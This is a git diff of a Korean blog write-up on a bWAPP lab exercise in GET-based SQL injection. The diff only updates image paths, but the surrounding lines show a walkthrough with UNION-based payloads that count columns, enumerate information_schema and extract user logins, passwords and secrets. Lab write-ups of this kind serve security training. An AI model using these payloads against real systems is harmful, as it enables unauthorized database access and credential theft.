@@ -12,15 +12,15 @@ author_profile: false
 
 ## Level - Low
 
-![그림 1-1](/assets/image/bwapp/sqli-get/image.png)
+![그림 1-1](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image.png)
 - 검색 기능이 존재하며, GET 방식으로 전송된다.
 - ‘ (싱글쿼터) 입력을 통해 Error 유/무를 체크해보았다.
 
-![그림 1-2](/assets/image/bwapp/sqli-get/image2.png)
+![그림 1-2](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image2.png)
 - Error 가 발생되며 DBMS Error 가 페이지상에 노출되고 있다.
 - MySQL 로 확인된다.
 
-![그림 1-3](/assets/image/bwapp/sqli-get/image3.png)
+![그림 1-3](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image3.png)
 - 연결 연산자를 통해 추가 확인을 했다.
 - DBMS Error 가 노출되고 있으니 Error Based 공격을 수행했다.
 
@@ -33,13 +33,13 @@ author_profile: false
 - 해당 Bee Box 에서는 Error Based 가 불가능 한 것으로 판단
 - Union Based 공격을 수행
 
-![그림 1-4](/assets/image/bwapp/sqli-get/image4.png)
+![그림 1-4](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image4.png)
 
 - order by 7 결과 정상적인 출력 확인
 - order by 8 결과 Error 발생 확인
 - 총 컬럼의 개수는 7개로 확인됨
 
-![그림 1-5](/assets/image/bwapp/sqli-get/image5.png)
+![그림 1-5](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image5.png)
 
 ```sql
 %' union select 1,2,3,4,5,6,7--
@@ -60,7 +60,7 @@ author_profile: false
 'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema='bWAPP' and table_name='users'--
 ```
 
-![그림 1-6](/assets/image/bwapp/sqli-get/image6.png)
+![그림 1-6](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image6.png)
 
 - 컬럼의 종류를 확인하였으니, 이제 확인 하고자 하는 컬럼의 데이터를 최종적으로 추출함.
 
@@ -68,7 +68,7 @@ author_profile: false
 'union select 1,concat(id,0x3a,login),concat(password,0x3a,secret),4,admin,6,7 from bWAPP.users-- 
 ```
 
-![그림 1-7](/assets/image/bwapp/sqli-get/image7.png)
+![그림 1-7](/assets/image/bwapp/injection/sqli-get-archive/sqli-get/image7.png)
 - 성공 적으로 Data를 획득 헀다.
 
 ## Medium & High
